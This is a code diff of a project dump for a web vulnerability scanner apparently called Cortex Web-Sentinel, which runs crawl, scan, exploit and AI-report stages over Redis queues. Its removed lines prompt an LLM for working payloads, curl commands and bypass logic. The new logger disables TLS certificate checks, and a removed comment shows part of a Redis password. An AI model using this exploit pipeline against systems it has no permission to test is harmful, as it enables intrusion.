@@ -1,93 +1,150 @@
 SELECTED PROJECT DUMP
-Included Items: requirements.txt, core, api/main.py, task_queue, Procfile, docker-compose.yml, api, workers, app.py, dockerfile, scanner, storage, test_redis.py, intelligence
+Included Items: api/main.py, intelligence, app.py, task_queue, docker-compose.yml, api, Procfile, workers, core, requirements.txt, storage, dockerfile, test_redis.py, scanner, run_all.py
 
 
 ==================== FILE: app.py ====================
 
 import streamlit as st
-import subprocess
-import psutil
-import os
+import json
+import uuid
 import time
+import psutil
+import subprocess
+from datetime import datetime
+
+# Import existing system logic
+from task_queue.redis_client import r as redis_conn, push
+from task_queue.queues import CRAWL_QUEUE
 from storage.database import DatabaseManager
-from dotenv import load_dotenv
 
-load_dotenv()
+# Initialize Database and Redis
 db = DatabaseManager()
+r = redis_conn 
 
-st.set_page_config(page_title="Sentinel AI Dashboard", layout="wide")
+st.set_page_config(page_title="Cortex Web-Sentinel", layout="wide")
 
-# --- Helper Functions for Process Management ---
-def get_worker_status():
-    """Check if worker.py is currently running."""
-    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+# --- Helper Functions (Merged from app.py & dashboard.py) ---
+def get_worker_status(worker_path):
+    """Check if a specific worker process is active."""
+    for proc in psutil.process_iter(['cmdline']):
         try:
-            if proc.info['cmdline'] and "workers/worker.py" in " ".join(proc.info['cmdline']):
-                return proc.info['pid']
+            if proc.info['cmdline'] and any(worker_path in arg for arg in proc.info['cmdline']):
+                return proc.pid
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
     return None
 
-def start_worker():
-    """Start the worker as a background process."""
-    log_file = open("worker_log.txt", "a")
-    # 'python' might need to be 'python3' depending on your OS
-    subprocess.Popen(
-        ["python", "workers/worker.py"],
-        stdout=log_file,
-        stderr=log_file,
-        start_new_session=True # This 'detaches' it from the UI process
-    )
+# --- UI Header ---
+st.title("🛡️ Cortex Web-Sentinel")
 
-# --- UI Layout ---
-st.title("🛡️ Sentinel AI Control Center")
+if r is None:
+    st.error("❌ Redis Connection Failed. Ensure redis-server is running.")
+    st.stop()
 
-tabs = st.tabs(["🚀 Launch Scan", "📊 Security Reports", "⚙️ System Monitor"])
+tabs = st.tabs(["🚀 Launch", "📊 Monitor", "📄 Reports", "⚙️ System"])
 
-# --- TAB 1: Launch ---
+# --- TAB 1: Launch Scan (Functional Entry Point) ---
 with tabs[0]:
-    st.subheader("New Audit")
-    col1, col2 = st.columns(2)
-    with col1:
-        url = st.text_input("Target URL", placeholder="https://example.com")
-    with col2:
-        uploaded_file = st.file_uploader("Or Upload Source (ZIP)", type="zip")
-    
-    if st.button("Start Global Scan", use_container_width=True):
-        st.info("Job sent to Redis. Worker will pick it up shortly.")
+    st.header("Start Web Audit")
+    with st.container(border=True):
+        url = st.text_input("Target URL", placeholder="https://testphp.vulnweb.com")
+        scan_mode = st.radio("Scan Mode", ["Discovery (Crawl Only)", "Full Audit (Crawl + Scan + Exploit)"], horizontal=True)
 
-# --- TAB 2: Reports ---
+    if st.button("🚀 Initialize Global Pipeline", use_container_width=True):
+        if url:
+            job_id = str(uuid.uuid4())
+            payload = {
+                "job_id": job_id,
+                "url": url,
+                "timestamp": datetime.now().isoformat(),
+                "mode": scan_mode
+            }
+            # Kicks off the first worker in the chain
+            push(CRAWL_QUEUE, payload)
+            st.session_state["active_job"] = job_id
+            st.success(f"Job Sent to Redis: {job_id}")
+        else:
+            st.warning("Please enter a target URL.")
+
+# --- TAB 2: Live Monitor (Merged from dashboard.py) ---
 with tabs[1]:
-    st.subheader("Verified Vulnerabilities")
-    # In production, you'd fetch real jobs from Supabase here
-    # jobs = db.get_jobs()
-    st.write("No active reports found. Run a scan to generate AI insights.")
+    active_id = st.text_input("Track Job ID", value=st.session_state.get("active_job", ""))
+    
+    if active_id:
+        # Progress Tracking Logic from dashboard.py
+        current_stage = r.get(f"status:{active_id}") or "queued"
+        stages = ["crawl", "scan", "exploit", "aggregation", "report"]
+        
+        progress = (stages.index(current_stage) + 1) / len(stages) if current_stage in stages else 0
+        st.subheader(f"Status: {current_stage.upper()}")
+        st.progress(progress)
 
-# --- TAB 3: System Monitor (The 'No-Terminal' Fix) ---
+        # Live Log Streaming Logic from dashboard.py
+        st.divider()
+        st.subheader("Real-Time Activity")
+        raw_logs = r.lrange(f"log:{active_id}", 0, -1)
+        if raw_logs:
+            for log in raw_logs[-20:]: # Show last 20 logs as requested in original
+                try:
+                    entry = json.loads(log)
+                    st.caption(f"[{entry.get('time', 'N/A')}] {entry.get('message', '')}")
+                except:
+                    st.text(log)
+        else:
+            st.info("Waiting for workers to report activity...")
+
+# --- TAB 3: Reports (Merged from app.py & dashboard.py) ---
 with tabs[2]:
-    st.subheader("Process Management")
-    
-    worker_pid = get_worker_status()
-    
-    if worker_pid:
-        st.success(f"✅ Worker is ONLINE (PID: {worker_pid})")
-        if st.button("🛑 Stop Worker"):
-            psutil.Process(worker_pid).terminate()
-            st.rerun()
+    st.header("Vulnerability Reports")
+    if active_id:
+        report_data = r.get(f"report:{active_id}")
+        if report_data:
+            report = json.loads(report_data)
+            st.success("✅ Final Audit Complete")
+            
+            # JSON Download Functionality from dashboard.py
+            st.json(report)
+            st.download_button(
+                label="📥 Download JSON Report",
+                data=json.dumps(report, indent=4),
+                file_name=f"sentinel_report_{active_id}.json",
+                mime="application/json"
+            )
+        else:
+            st.write("No final report generated yet for this Job ID.")
     else:
-        st.error("❌ Worker is OFFLINE")
-        if st.button("▶️ Start Worker"):
-            start_worker()
-            st.toast("Worker starting in background...")
-            time.sleep(2)
-            st.rerun()
+        st.write("Enter a Job ID in the Monitor tab to see report data.")
 
-    st.divider()
-    st.subheader("System Logs")
-    if os.path.exists("worker_log.txt"):
-        with open("worker_log.txt", "r") as f:
-            logs = f.readlines()
-            st.text_area("Last 20 lines of Worker output:", "".join(logs[-20:]), height=200)
+# --- TAB 4: System (Worker Management from app.py) ---
+with tabs[3]:
+    st.subheader("Worker Process Controller")
+    workers = {
+        "Crawl Worker": "workers/crawl_worker.py",
+        "Scan Worker": "workers/scan_worker.py",
+        "Exploit Worker": "workers/exploit_worker.py"
+    }
+
+    for name, path in workers.items():
+        pid = get_worker_status(path)
+        c1, c2 = st.columns([3, 1])
+        with c1:
+            st.write(f"**{name}**")
+            st.code(f"PID: {pid}" if pid else "Status: OFFLINE")
+        with c2:
+            if not pid:
+                if st.button("Start", key=f"start_{name}"):
+                    subprocess.Popen(["python", path])
+                    time.sleep(1)
+                    st.rerun()
+            else:
+                if st.button("Stop", key=f"stop_{name}"):
+                    psutil.Process(pid).terminate()
+                    st.rerun()
+
+# --- Sync & Refresh ---
+if st.session_state.get("active_job"):
+    time.sleep(4)
+    st.rerun()
 
 ==================== FILE: docker-compose.yml ====================
 
@@ -129,7 +186,7 @@ services:
   scanner_specialist:
     build: .
     container_name: sentinel_scanner
-    command: python workers/active_scanner.py
+    command: python workers/crawl_worker.py
     env_file:
       - .env
     depends_on:
@@ -141,11 +198,29 @@ services:
         limits:
           memory: 1G
 
+  scan_specialist:
+    build: .
+    command: python workers/scan_worker.py
+    env_file: .env
+    depends_on:
+      redis:
+        condition: service_healthy
+    restart: always
+
+  report_specialist:
+    build: .
+    command: python workers/report_worker.py
+    env_file: .env
+    depends_on:
+      redis:
+        condition: service_healthy
+    restart: always
+
   # 4. AGGREGATOR SPECIALIST - The "Brain" (AI & Report Generation)
   aggregator_specialist:
     build: .
     container_name: sentinel_aggregator
-    command: python workers/aggregation_workers.py
+    command: python workers/aggregation_worker.py
     env_file:
       - .env
     depends_on:
@@ -207,12 +282,70 @@ reportlab
 supabase
 redis
 
-# Mobile Scanning
-androguard
 
 # NOTE: apktool is a Java binary, not a pip package.
 # It is installed via the Dockerfile automatically.
 # For local dev: https://apktool.org/docs/install
+
+==================== FILE: run_all.py ====================
+
+import subprocess
+import sys
+import threading
+import time
+
+# List all the modules to run
+WORKERS = [
+    {"name": "BRAIN (API)  ", "cmd": ["python", "-m", "api.main"]},
+    {"name": "MUSCLE (Scan)", "cmd": ["python", "-m", "workers.scan_worker"]},
+    {"name": "exploit", "cmd": ["python", "-m", "workers.exploit_worker"]},
+    {"name": "aggregation", "cmd": ["python", "-m", "workers.aggregation_worker"]},
+    {"name": "report", "cmd": ["python", "-m", "workers.report_worker"]},
+    {"name": "FACE (Dash) ", "cmd": ["streamlit", "run", "app/dashboard.py", "--server.headless", "true"]},
+]
+
+def stream_logs(pipe, name):
+    """Reads output from a subprocess and prints it with a prefix."""
+    for line in iter(pipe.readline, b''):
+        # Print with the worker's name so you know who is talking
+        print(f"[{name}] {line.decode().strip()}")
+    pipe.close()
+
+def start_system():
+    processes = []
+    print("🚀 Starting Sentinel AI Stack...\n")
+
+    for worker in WORKERS:
+        # We use bufsize=0 and stdout=PIPE to catch logs in real-time
+        p = subprocess.Popen(
+            worker["cmd"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            bufsize=0
+        )
+        processes.append(p)
+        
+        # Start a background thread for each worker to handle its logs
+        thread = threading.Thread(target=stream_logs, args=(p.stdout, worker["name"]))
+        thread.daemon = True # Thread dies when main script dies
+        thread.start()
+        
+        print(f"✅ Launched {worker['name']}")
+        time.sleep(2) # Give Redis/Port a moment to breathe
+
+    print("\n🔥 All systems active. Streaming logs below. Press Ctrl+C to stop.\n" + "="*60)
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n🛑 Shutting down all processes...")
+        for p in processes:
+            p.terminate()
+        print("👋 Goodbye.")
+
+if __name__ == "__main__":
+    start_system()
 
 ==================== FILE: test_redis.py ====================
 
@@ -220,20 +353,12 @@ import redis
 import os
 from dotenv import load_dotenv
 
-# 1. Load the URL from your .env file
 load_dotenv()
-REDIS_URL = os.getenv("REDIS_URL")
 
-# 2. Connect to the Cloud
-# Using the URL you got: redis://:mQ6OU5...
 try:
-    r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
-    
-    # 3. Test the connection
-    r.set("sentinel_status", "System Online")
-    value = r.get("sentinel_status")
-    print(f"✅ Connection Successful! Sentinel is: {value}")
-    
+    r = redis.Redis.from_url(os.getenv("REDIS_URL"))
+    r.ping()
+    print("✅ Connection Successful! Local Redis is talking to Python.")
 except Exception as e:
     print(f"❌ Connection Failed: {e}")
 
@@ -353,10 +478,8 @@ from fastapi import FastAPI, Security, HTTPException, Depends
 from fastapi.security.api_key import APIKeyHeader
 from contextlib import asynccontextmanager
 from dotenv import load_dotenv
-
-from task_queue.redis_scanner import enqueue_scan
 from task_queue.redis_client import push
-from task_queue.queues import NETWORK_QUEUE, MOBILE_QUEUE, API_QUEUE
+from task_queue.queues import  API_QUEUE, SCAN_QUEUE
 from core.job_tracker import create_job, get_job
 from storage.database import DatabaseManager
 from scanner.report_builder import ReportBuilder
@@ -366,10 +489,10 @@ from scanner.dast.rate_limiter import RateLimiter
 
 load_dotenv()
 
-builder  = ReportBuilder()
-guard    = SafetyGuard()
+builder = ReportBuilder()
+guard = SafetyGuard()
 verifier = DomainVerifier()
-limiter  = RateLimiter()
+limiter = RateLimiter()
 
 # FIX: detect Docker by checking for the container sentinel env var or hostname
 # Only start an inline worker thread when running locally (not in Docker),
@@ -411,8 +534,9 @@ db = DatabaseManager()
 @app.post("/scan")
 async def scan(req: dict, key: str = Depends(verify_api_key)):
     target_url = req.get("url")
-    user_id    = key
+    user_id = key
 
+    # 1. Safety Guards (All pass or raise Exception)
     if not target_url:
         raise HTTPException(400, "Missing URL")
     if not limiter.allow(user_id):
@@ -421,46 +545,27 @@ async def scan(req: dict, key: str = Depends(verify_api_key)):
         raise HTTPException(403, "Target not allowed")
     if not req.get("verified", False):
         raise HTTPException(403, "Domain not verified")
-        job_id = str(uuid.uuid4())
-        create_job(job_id, target_url)
 
-        # FIX: Use the explicit SCAN_QUEUE and the push function
-        from task_queue.queues import SCAN_QUEUE
-        push(SCAN_QUEUE, {
-            "job_id": job_id,
-            "url": target_url,
-            "auth": req.get("auth")
-        })
-
-        return {"job_id": job_id, "type": "web_scan"}
-
-@app.post("/scan/network")
-async def scan_network(req: dict, key: str = Depends(verify_api_key)):
-    host    = req.get("host") or req.get("url")
-    user_id = key
-
-    if not host:
-        raise HTTPException(400, "Missing host")
-    if not limiter.allow(user_id):
-        raise HTTPException(429, "Too many requests")
-    if not req.get("verified", False):
-        raise HTTPException(403, "You must confirm you have permission to scan this host")
-
+    # 2. JOB EXECUTION (Must be at this indentation level)
     job_id = str(uuid.uuid4())
-    create_job(job_id, host)
-    push(NETWORK_QUEUE, {
-        "job_id":     job_id,
-        "url":        host,
-        "port_range": req.get("port_range"),
+    create_job(job_id, target_url)
+
+    from task_queue.queues import SCAN_QUEUE
+    push(SCAN_QUEUE, {
+        "job_id": job_id,
+        "url": target_url,
+        "auth": req.get("auth")
     })
 
-    return {"job_id": job_id, "type": "network_scan"}
+    return {"job_id": job_id, "type": "web_scan"}
+
+
 
 
 @app.post("/scan/api")
 async def scan_api(req: dict, key: str = Depends(verify_api_key)):
     target_url = req.get("url")
-    user_id    = key
+    user_id = key
 
     if not target_url:
         raise HTTPException(400, "Missing URL")
@@ -474,10 +579,10 @@ async def scan_api(req: dict, key: str = Depends(verify_api_key)):
     job_id = str(uuid.uuid4())
     create_job(job_id, target_url)
     push(API_QUEUE, {
-        "job_id":     job_id,
-        "url":        target_url,
+        "job_id": job_id,
+        "url": target_url,
         "auth_token": req.get("auth_token"),
-        "spec_url":   req.get("spec_url"),
+        "spec_url": req.get("spec_url"),
     })
 
     return {"job_id": job_id, "type": "api_scan"}
@@ -562,22 +667,11 @@ async def upload_file(file: UploadFile):
 
     logging.info(f"[UPLOAD] Saved {ext} to {save_path}")
 
-    if ext == ".apk":
-        return await _handle_apk(save_path, filename)
+    
     if ext == ".zip":
         return await _handle_zip(save_path)
 
 
-async def _handle_apk(apk_path, original_filename):
-    job_id = str(uuid.uuid4())
-    create_job(job_id, original_filename)
-    push(MOBILE_QUEUE, {"job_id": job_id, "apk_path": apk_path})
-    logging.info(f"[UPLOAD] APK enqueued. job_id={job_id}")
-    return {
-        "job_id":  job_id,
-        "type":    "mobile_scan",
-        "message": "APK queued for analysis. Poll /job/{job_id} for status.",
-    }
 
 
 async def _handle_zip(zip_path):
@@ -641,389 +735,310 @@ def append_findings(job_id, findings):
     db.db.table("vulnerabilities").insert(data).execute()
 
 
-==================== FILE: core\orchestrator.py ====================
-
-import asyncio
-from task_queue.redis_client import push
-from task_queue.queues import (
-    CRAWL_QUEUE,
-    SAST_QUEUE,
-    NETWORK_QUEUE,
-    MOBILE_QUEUE,
-    SCAN_QUEUE,
-    EXPLOIT_QUEUE,
-    AGGREGATION_QUEUE,
-    REPORT_QUEUE,
-)
-
-from core.state_manager import StateManager
-
-
-class Orchestrator:
-    def __init__(self):
-        self.state = StateManager()
-
-    async def start_job(self, job: dict):
-        job_id = job["job_id"]
-        scan_type = job.get("scan_type", "web")
-
-        print(f"[Orchestrator] Starting job {job_id} ({scan_type})")
-
-        # Initialize job state
-        self.state.init_job(job_id, scan_type)
-
-        if scan_type == "web":
-            await self._start_web(job)
-
-        elif scan_type == "network":
-            await self._start_network(job)
-
-        elif scan_type == "mobile":
-            await self._start_mobile(job)
-
-        else:
-            raise ValueError(f"Unknown scan type: {scan_type}")
-
-    async def _start_web(self, job):
-        job_id = job["job_id"]
-
-        push(CRAWL_QUEUE, job)
-
-        if job.get("zip_path"):
-            push(SAST_QUEUE, job)
-
-    async def _start_network(self, job):
-        push(NETWORK_QUEUE, job)
-
-    async def _start_mobile(self, job):
-        push(MOBILE_QUEUE, job)
-
-    # 🔥 THIS IS THE MISSING PIECE
-    async def on_stage_complete(self, job_id: str, stage: str, data=None):
-        print(f"[Orchestrator] {job_id} completed stage: {stage}")
-
-        self.state.mark_done(job_id, stage)
-
-        # --- FLOW CONTROL ---
-
-        if stage == "crawl":
-            push(SCAN_QUEUE, {"job_id": job_id, "source": "crawl", "data": data})
-
-        elif stage == "sast":
-            push(SCAN_QUEUE, {"job_id": job_id, "source": "sast", "data": data})
-
-        elif stage in ["scan"]:
-            push(EXPLOIT_QUEUE, {"job_id": job_id, "data": data})
-
-        elif stage == "exploit":
-            push(AGGREGATION_QUEUE, {"job_id": job_id, "data": data})
-
-        # --- FINAL COMPLETION CHECK ---
-        if self.state.is_complete(job_id):
-            print(f"[Orchestrator] Job {job_id} COMPLETE → generating report")
-            push(REPORT_QUEUE, {"job_id": job_id})
-
-==================== FILE: core\state_manager.py ====================
+==================== FILE: core\logger.py ====================
 
 import redis
 import json
+import time
+import os
 
-r = redis.Redis(host="localhost", port=6379, decode_responses=True)
+REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
+r = redis.Redis.from_url(REDIS_URL, decode_responses=True, ssl_cert_reqs=None)
+
+current_stage = None
+
+def set_stage(stage: str):
+    global current_stage
+    current_stage = stage
+    print(f"[STAGE] {stage}")
+
+
+def log_event(job_id, stage, message):
+    entry = {
+        "time": time.strftime("%H:%M:%S"),
+        "stage": stage,
+        "message": message
+    }
+
+    r.rpush(f"log:{job_id}", json.dumps(entry))
+    r.ltrim(f"log:{job_id}", -100, -1)  # keep last 100 logs
+
+==================== FILE: core\orchestrator.py ====================
+
+# core/orchestrator.py
+from task_queue.redis_client import push
+from task_queue.queues import CRAWL_QUEUE, SCAN_QUEUE, EXPLOIT_QUEUE, AGGREGATION_QUEUE, REPORT_QUEUE
+
+class Orchestrator:
+    async def on_stage_complete(self, job_id, stage, data=None):
+        print(f"[Orchestrator] {job_id} completed stage: {stage}")
+        
+        # Ensure data structure is consistent
+        data = data or {"findings": [], "urls": []}
+
+        # 1. NEW: Handle Crawl -> Scan transition
+        if stage == "crawl":
+            urls_to_scan = data.get("urls", [])
+            if not urls_to_scan:
+                print(f"[Orchestrator] {job_id} Crawl finished with 0 URLs. Skipping scan.")
+                # Directly jump to report or end
+                return 
+
+            # Centralized Routing: Push the found URLs into the Scan Queue
+            push(SCAN_QUEUE, {
+                "job_id": job_id,
+                "urls": urls_to_scan, # Pass the list of discovered pages
+                "data": data
+            })
+
+        # 2. Handle Scan -> Exploit
+        elif stage == "scan":
+            push(EXPLOIT_QUEUE, {
+                "job_id": job_id,
+                "data": data
+            })
+
+        # 3. Handle Exploit -> Aggregation
+        elif stage == "exploit":
+            push(AGGREGATION_QUEUE, {
+                "job_id": job_id,
+                "data": data
+            })
+
+        # 4. Handle Aggregation -> Report
+        elif stage == "aggregation":
+            push(REPORT_QUEUE, {
+                "job_id": job_id,
+                "data": data
+            })
+
+==================== FILE: core\state_manager.py ====================
+
+# core/state_manager.py
+import os, json, redis
+
+REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
+r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
 
 class StateManager:
-    def _key(self, job_id):
-        return f"job_state:{job_id}"
+    def _key(self, job_id): return f"job_state:{job_id}"
 
     def init_job(self, job_id, scan_type):
         state = {
             "scan_type": scan_type,
             "stages": {
-                "crawl": "pending",
-                "sast": "pending",
-                "scan": "pending",
-                "exploit": "pending",
-                "aggregation": "pending",
+                "crawl": "pending", "scan": "pending",
+                "exploit": "pending", "aggregation": "pending",
                 "report": "pending",
             }
         }
-        r.set(self._key(job_id), json.dumps(state))
+        r.set(self._key(job_id), json.dumps(state), ex=86400)
 
     def mark_done(self, job_id, stage):
-        state = json.loads(r.get(self._key(job_id)))
-        state["stages"][stage] = "done"
-        r.set(self._key(job_id), json.dumps(state))
+        raw = r.get(self._key(job_id))
+        if not raw: return
+        state = json.loads(raw)
+        if stage in state["stages"]:
+            state["stages"][stage] = "done"
+        r.set(self._key(job_id), json.dumps(state), ex=86400)
 
     def is_complete(self, job_id):
-        state = json.loads(r.get(self._key(job_id)))
-        stages = state["stages"]
+        raw = r.get(self._key(job_id))
+        if not raw: return False
+        stages = json.loads(raw)["stages"]
+        return all(stages.get(s) == "done" for s in ["scan", "aggregation"])
 
-        # define completion rules
-        required = ["scan", "exploit", "aggregation"]
-
-        return all(stages[s] == "done" for s in required)
-
-==================== FILE: core\system.py ====================
-
-from core.orchestrator import Orchestrator
-
-orchestrator = Orchestrator()
 
 ==================== FILE: core\__init__.py ====================
 
 
 
+==================== FILE: intelligence\__init__.py ====================
+
+
+
 ==================== FILE: intelligence\ai\report_generator.py ====================
 
-import os
-import json
-import asyncio
-import logging
+# intelligence/ai/report_generator.py
+import os, json, asyncio, logging
 import google.generativeai as genai
 from dotenv import load_dotenv
 from scanner.ai_brain import AIBrain
 
 load_dotenv()
+logger = logging.getLogger(__name__)
 
 
-def safe_json_parse(text):
+def safe_json_parse(text: str):
     try:
-        if "{" in text:
-            text = text[text.find("{"):text.rfind("}") + 1]
-        return json.loads(text)
+        s = text.find("{")
+        e = text.rfind("}")
+        if s >= 0 and e >= 0:
+            return json.loads(text[s:e+1])
     except Exception:
-        return None
-
-
-class ExploitGenerator:
-    def __init__(self, model):
-        self.model = model
-
-    async def generate_poc(self, vuln_type, url, evidence=None):
-        prompt = f"""
-        Target: {url}
-        Vulnerability: {vuln_type}
-        Context: {evidence}
-
-        TASK:
-        1. Provide a working payload
-        2. Provide a curl command
-        3. Explain bypass logic briefly
-
-        Return JSON:
-        {{
-          "payload": "...",
-          "curl_command": "...",
-          "explanation": "..."
-        }}
-        """
-        try:
-            response = await asyncio.to_thread(self.model.generate_content, prompt)
-            parsed = safe_json_parse(response.text)
-            return parsed if parsed else {"error": "Invalid PoC format"}
-        except Exception as e:
-            return {"error": str(e)}
+        pass
+    return None
 
 
 class AIReportGenerator:
     def __init__(self):
-        api_key = os.getenv("GEMINI_API_KEY")
-        genai.configure(api_key=api_key)
+        genai.configure(api_key=os.getenv("GEMINI_API_KEY"))
+        self._model    = genai.GenerativeModel("gemini-1.5-flash")
+        self.brain     = AIBrain()
 
-        self._model = genai.GenerativeModel("gemini-1.5-flash")
-        self.exploit_gen = ExploitGenerator(self._model)
-
-        # FIX: expose brain publicly so workers.py can call
-        # reporter.brain.analyze_attack_chain(...)
-        self.brain = AIBrain()
-
-    async def generate_report(self, data, target):
+    async def generate_report(self, data: dict, target: str) -> dict:
         findings     = data.get("findings", [])
         attack_graph = data.get("attack_graph", {})
         chains       = data.get("chains", [])
 
         if not findings:
-            return {
-                "target":   target,
-                "summary":  "No vulnerabilities found.",
-                "findings": [],
-            }
+            return {"target": target, "summary": {"total": 0}, "findings": []}
 
-        prompt = f"""
-        You are an elite penetration tester.
+        summary = {
+            "total":    len(findings),
+            "critical": sum(1 for f in findings if f.get("severity") == "Critical"),
+            "high":     sum(1 for f in findings if f.get("severity") == "High"),
+            "medium":   sum(1 for f in findings if f.get("severity") == "Medium"),
+            "low":      sum(1 for f in findings if f.get("severity") == "Low"),
+        }
 
-        TARGET: {target}
+        prompt = f"""You are a senior web application penetration tester writing a professional security report.
 
-        DATA:
-        Findings:
-        {json.dumps(findings, indent=2)}
+TARGET: {target}
 
-        Attack Graph:
-        {json.dumps(attack_graph, indent=2)}
+VERIFIED FINDINGS ({len(findings)} total):
+{json.dumps(findings, indent=2)}
 
-        Exploit Chains:
-        {json.dumps(chains, indent=2)}
+ATTACK CHAINS:
+{json.dumps(chains, indent=2)}
 
-        Task:
-        1. Provide a SAFE example payload (non-destructive).
-        2. Provide a demonstration request (no real exploitation).
-        3. Explain the vulnerability.
+For each finding provide:
+1. Clear technical explanation of the vulnerability
+2. Exact reproduction steps
+3. Real-world business impact
+4. Specific remediation code or configuration
 
-        Do NOT provide weaponized or destructive payloads.
-
-        OUTPUT JSON:
-        {{
-          "critical_paths": [],
-          "findings": [],
-          "recommendations": []
-        }}
-        """
+Return ONLY valid JSON in this exact structure:
+{{
+  "executive_summary": "2-3 sentence business-level summary",
+  "findings": [
+    {{
+      "type": "...",
+      "severity": "Critical|High|Medium|Low",
+      "url": "...",
+      "parameter": "...",
+      "payload": "...",
+      "confidence": 0.0-1.0,
+      "description": "technical explanation",
+      "impact": "business impact",
+      "reproduction": ["step 1", "step 2"],
+      "remediation": "specific fix with code example",
+      "cwe": "CWE-XX",
+      "cvss": 0.0-10.0
+    }}
+  ],
+  "recommendations": ["priority fix 1", "priority fix 2"],
+  "attack_narrative": "how these findings chain together"
+}}"""
 
         try:
-            response = await asyncio.to_thread(self._model.generate_content, prompt)
-            ai_data  = safe_json_parse(response.text)
-
+            res     = await asyncio.to_thread(self._model.generate_content, prompt)
+            ai_data = safe_json_parse(res.text)
             if not ai_data:
-                raise Exception("AI returned invalid JSON")
+                raise ValueError("AI returned unparseable response")
 
-            refined_findings = ai_data.get("findings", [])
-
-            # Generate PoCs for high-confidence findings
-            enriched = []
-            for f in refined_findings:
-                if float(f.get("confidence", 0.5)) >= 0.7:
-                    logging.info(f"[AI] Generating PoC for {f.get('title')}")
-                    poc = await self.exploit_gen.generate_poc(
-                        f.get("title"),
-                        f.get("url", target),
-                        f.get("evidence"),
-                    )
-                    f["poc"] = poc
-
-                # Normalize severity
-                sev = str(f.get("severity", "Low")).capitalize()
-                if sev not in ("Critical", "High", "Medium", "Low"):
+            # Normalize severities
+            for f in ai_data.get("findings", []):
+                sev = str(f.get("severity","Low")).capitalize()
+                if sev not in ("Critical","High","Medium","Low"):
                     sev = "Medium"
                 f["severity"] = sev
-                enriched.append(f)
 
-            report = {
-                "target": target,
-                "summary": {
-                    "total_findings":     len(findings),
-                    "validated_findings": len(enriched),
-                    "critical":           len([f for f in enriched if f["severity"] == "Critical"]),
-                    "high":               len([f for f in enriched if f["severity"] == "High"]),
-                    "chains_detected":    len(chains),
-                },
-                "critical_paths": ai_data.get("critical_paths", []),
-                "findings":       enriched,
-                "recommendations": ai_data.get("recommendations", []),
+            return {
+                "target":            target,
+                "summary":           summary,
+                "executive_summary": ai_data.get("executive_summary",""),
+                "findings":          ai_data.get("findings", findings),
+                "recommendations":   ai_data.get("recommendations", []),
+                "attack_narrative":  ai_data.get("attack_narrative",""),
+                "attack_graph":      attack_graph,
+                "chains":            chains,
             }
-            return report
 
         except Exception as e:
-            logging.error(f"[AI ERROR] {e}")
+            logger.error(f"[AI REPORT] Error: {e}")
             return {
-                "target":       target,
-                "status":       "fallback",
-                "message":      "AI failed, returning raw structured data",
-                "findings":     findings,
-                "attack_graph": attack_graph,
-                "chains":       chains,
+                "target":   target,
+                "summary":  summary,
+                "findings": findings,
+                "status":   "fallback",
             }
+
+
+==================== FILE: intelligence\ai\__init__.py ====================
+
 
 
 ==================== FILE: intelligence\attack_graph\engine.py ====================
 
+# intelligence/attack_graph/engine.py
 class AttackGraph:
     def __init__(self):
         self.nodes = []
         self.edges = []
 
-    # -------------------------
-    # ADD NODE
-    # -------------------------
     def add_node(self, vuln):
         node = {
-            "id": len(self.nodes),
-            "type": vuln.get("type"),
-            "url": vuln.get("url"),
-            "severity": vuln.get("severity"),
-            "confidence": vuln.get("confidence", 0.5)
+            "id":         len(self.nodes),
+            "type":       vuln.get("type"),
+            "subtype":    vuln.get("subtype",""),
+            "url":        vuln.get("url"),
+            "severity":   vuln.get("severity"),
+            "confidence": vuln.get("confidence", 0.5),
         }
         self.nodes.append(node)
         return node
 
-    # -------------------------
-    # BUILD GRAPH
-    # -------------------------
     def build(self, findings):
         self.nodes = []
         self.edges = []
-
         for f in findings:
             self.add_node(f)
+        for i, a in enumerate(self.nodes):
+            for j, b in enumerate(self.nodes):
+                if i == j: continue
+                rel = self._can_chain(a, b)
+                if rel:
+                    self.edges.append({"from": a["id"], "to": b["id"], "type": rel})
+        return {"nodes": self.nodes, "edges": self.edges}
 
-        for i in range(len(self.nodes)):
-            for j in range(len(self.nodes)):
-
-                if i == j:
-                    continue
-
-                a = self.nodes[i]
-                b = self.nodes[j]
-
-                relation = self.can_chain(a, b)
-
-                if relation:
-                    self.edges.append({
-                        "from": a["id"],
-                        "to": b["id"],
-                        "type": relation
-                    })
-
-        return {
-            "nodes": self.nodes,
-            "edges": self.edges
-        }
-
-    # -------------------------
-    # CHAIN LOGIC
-    # -------------------------
-    def can_chain(self, a, b):
-
-        # XSS → Session Hijack → Auth Access
-        if a["type"] == "Cross-Site Scripting (XSS)" and "admin" in b["url"]:
-            return "session_hijack"
-
-        # SQLi → Data Exposure
-        if a["type"] == "SQL Injection" and b["type"] == "Sensitive Data Exposure":
-            return "data_exfiltration"
-
-        # Auth → Admin
-        if "login" in a["url"] and "admin" in b["url"]:
-            return "privilege_escalation"
-
+    def _can_chain(self, a, b):
+        at, bt = a["type"], b["type"]
+        au, bu = a.get("url",""), b.get("url","")
+        if "XSS" in at and "admin" in bu: return "session_hijack_to_admin"
+        if "SQL" in at and "Sensitive" in bt: return "data_exfiltration"
+        if "SQL" in at and "admin" in bu: return "auth_bypass_to_admin"
+        if "SSTI" in at: return "potential_rce"
+        if "LFI" in at and "SQL" in bt: return "credential_harvest"
+        if "Open Redirect" in at and "XSS" in bt: return "phishing_chain"
+        if "CORS" in at and "XSS" in bt: return "cross_origin_data_theft"
+        if "login" in au and "admin" in bu: return "privilege_escalation"
         return None
 
-    # -------------------------
-    # FIND CRITICAL CHAINS
-    # -------------------------
     def find_attack_paths(self):
         paths = []
-
         for edge in self.edges:
             start = self.nodes[edge["from"]]
-            end = self.nodes[edge["to"]]
-
-            if start["severity"] == "Critical" or end["severity"] == "Critical":
-                paths.append({
-                    "path": [start, end],
-                    "impact": edge["type"]
-                })
-
+            end   = self.nodes[edge["to"]]
+            if start["severity"] in ("Critical","High") or end["severity"] in ("Critical","High"):
+                paths.append({"path": [start, end], "impact": edge["type"]})
         return paths
+
+
+==================== FILE: intelligence\attack_graph\__init__.py ====================
+
+
 
 ==================== FILE: intelligence\prioritization\risk_prioritizer.py ====================
 
@@ -1078,405 +1093,209 @@ class RiskPrioritizer:
 
         return prioritized
 
